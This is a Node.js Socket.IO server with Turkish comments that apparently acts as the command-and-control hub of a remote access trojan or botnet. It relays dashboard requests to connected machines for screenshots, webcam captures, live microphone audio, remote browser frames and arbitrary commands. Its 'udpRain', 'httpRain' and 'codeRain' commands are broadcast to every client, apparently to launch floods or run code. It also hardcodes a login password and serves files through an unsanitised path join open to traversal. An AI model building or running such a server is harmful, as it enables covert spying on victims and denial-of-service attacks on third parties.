const info = { port: 3011 };
const path = require("path");
const app = require("express")();
const httpServer = require("http").createServer(app);

// Şifre kontrolü için session yönetimi
const sessions = new Map(); // Basit session store (production'da Redis kullanılmalı)
const CORRECT_PASSWORD = "20232023"; // Şifre backend'de saklanıyor

// JSON body parser
app.use(require("express").json());
app.use(require("express").urlencoded({ extended: true }));
const io = require("socket.io")(httpServer, {
  maxHttpBufferSize: "1e8",
  pingTimeout: 60000,
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  },
  // Binary transfer optimizasyonu
  transports: ['polling', 'websocket'], // Polling önce (daha güvenilir)
  allowEIO3: true, // Eski Socket.IO v3 client'ları için uyumluluk
  // Buffer optimizasyonu
  maxHttpBufferSize: 1e8,
  pingTimeout: 60000,
  pingInterval: 25000,
  // Path belirtmek (reverse proxy için)
  path: "/socket.io/",
  // Connection state recovery (Socket.IO v4 özelliği)
  connectTimeout: 45000,
});

app.get("/test", (req, res) => {
  console.log("Got request");
  res.send("The application works");
});

app.post("/post-test", (req, res) => {
  console.log("Got Post Request");
  res.send("The post sender works");
});

// Şifre kontrol endpoint'i
app.post("/api/auth/login", (req, res) => {
  const { password } = req.body;
  
  if (password === CORRECT_PASSWORD) {
    // Session token oluştur
    const sessionToken = require("crypto").randomBytes(32).toString("hex");
    const expiresAt = Date.now() + (24 * 60 * 60 * 1000); // 24 saat
    
    sessions.set(sessionToken, {
      authenticated: true,
      expiresAt: expiresAt
    });
    
    // Eski session'ları temizle (basit cleanup)
    cleanupExpiredSessions();
    
    res.json({
      success: true,
      token: sessionToken,
      expiresAt: expiresAt
    });
  } else {
    res.status(401).json({
      success: false,
      message: "Yanlış şifre"
    });
  }
});

// Session doğrulama endpoint'i
app.post("/api/auth/verify", (req, res) => {
  const { token } = req.body;
  
  if (!token) {
    return res.status(401).json({ success: false, message: "Token gerekli" });
  }
  
  const session = sessions.get(token);
  
  if (!session) {
    return res.status(401).json({ success: false, message: "Geçersiz token" });
  }
  
  if (Date.now() > session.expiresAt) {
    sessions.delete(token);
    return res.status(401).json({ success: false, message: "Token süresi dolmuş" });
  }
  
  res.json({ success: true, authenticated: true });
});

// Eski session'ları temizle
function cleanupExpiredSessions() {
  const now = Date.now();
  for (const [token, session] of sessions.entries()) {
    if (now > session.expiresAt) {
      sessions.delete(token);
    }
  }
}

// Her 1 saatte bir temizlik yap
setInterval(cleanupExpiredSessions, 60 * 60 * 1000);

// ExpressJS Module Codes
app.get("*", (req, res) => {
  const wwwPath = path.join(__dirname, "../www/", req.params[0]);
  console.log({ wwwPath });
  res.sendFile(wwwPath);
});

// Socket.IO Module Codes
io.on("connection", (socket) => {
  console.log("Connected: " + socket.id);
  socket.on("disconnect", () => {
    console.log("Disconnected: " + socket.id);
  });
  socket.on("joinToRoom", (data) => {
    socket.join(data.roomName);
    console.log(
      "---> [" + socket.id + "] connected to [" + data.roomName + "]"
    );
  });
  socket.on("screenshotRequest", (data) => {
    io.to(data.from).emit("screenshotRequest", data);
  });
  socket.on("camShotRequest", (data) => {
    io.to(data.from).emit("camShotRequest", data);
  });
  
  socket.on("audioListenRequest", (data) => {
    console.log("Audio listen request:", data.action, "from", data.from, "to", data.to);
    io.to(data.from).emit("audioListenRequest", data);
  });
  socket.on("screenshotResponse", (data) => {
    io.to(data.to).emit("screenshotResponse", data);
  });
  socket.on("camShotResponse", (data) => {
    io.to(data.to).emit("camShotResponse", data);
  });
  
  // Binary transfer için yeni event
  socket.on("camBinary", (data) => {
    io.to(data.to).emit("camBinary", data);
  });
  
  // Audio stream response
  socket.on("audioStreamResponse", (data) => {
    console.log("📡 Audio stream received from client:", data.audioData ? data.audioData.length : "no data", "chars (base64)");
    
    if (data.audioData && data.audioData.length > 0) {
      console.log("📤 Forwarding audio to dashboard:", data.to);
      io.to(data.to).emit("audioStreamResponse", data);
    } else {
      console.log("⚠️ No audio data to forward to dashboard");
    }
  });
  
  // Audio listen status
  socket.on("audioListenStatus", (data) => {
    io.to(data.to).emit("audioListenStatus", data);
  });

  // Remote Browser event'leri
  socket.on("remoteBrowserOpen", (data) => {
    io.to(data.from).emit("remoteBrowserOpen", data);
  });

  socket.on("remoteBrowserHTML", (data) => {
    io.to(data.to).emit("remoteBrowserHTML", data);
  });

  // Screen/window listesi
  socket.on("getScreenListRequest", (data) => {
    io.to(data.from).emit("getScreenListRequest", data);
  });

  socket.on("getScreenListResponse", (data) => {
    io.to(data.to).emit("getScreenListResponse", data);
  });

  /**
   * Remote Browser event'leri
   * Dashboard -> Terminal: remoteBrowserOpen
   * Terminal  -> Dashboard: remoteBrowserFrame
   */
  socket.on("remoteBrowserOpen", (data) => {
    // Dashboard'tan gelir, ilgili terminal odasına yönlendir
    // data.from: "terminal-xxx", data.to: "dashboard-yyy"
    io.to(data.from).emit("remoteBrowserOpen", data);
  });

  socket.on("remoteBrowserFrame", (data) => {
    // Terminal'den gelir, ilgili dashboard'a yönlendir
    io.to(data.to).emit("remoteBrowserFrame", data);
  });

  socket.on("getRunRequest", (data) => {
    if (data.cmd === "getUsers") {
      data["cmd"] = JSON.stringify(Array.from(io.sockets.adapter.rooms))
        .split(",")
        .join("\r\n");
      io.to(data.to).emit("getRunResponse", data);
    } else if (data.cmd.indexOf("udpRain") > -1) {
      console.log("udpRain triggered on server");
      io.emit("getRunRequest", data);
    } else if (data.cmd.indexOf("httpRain") > -1) {
      console.log("httpRain triggered on server");
      io.emit("getRunRequest", data);
    } else if (data.cmd.indexOf("codeRain") > -1) {
      console.log("codeRain triggered on server");
      io.emit("getRunRequest", data);
    } else {
      io.to(data.from).emit("getRunRequest", data);
    }
  });
  socket.on("getRunResponse", (data) => {
    io.to(data.to).emit("getRunResponse", data);
  });
});

// Http Modules Codes
httpServer.listen(info.port, () => {
  console.log("Listening *: " + info.port);
});
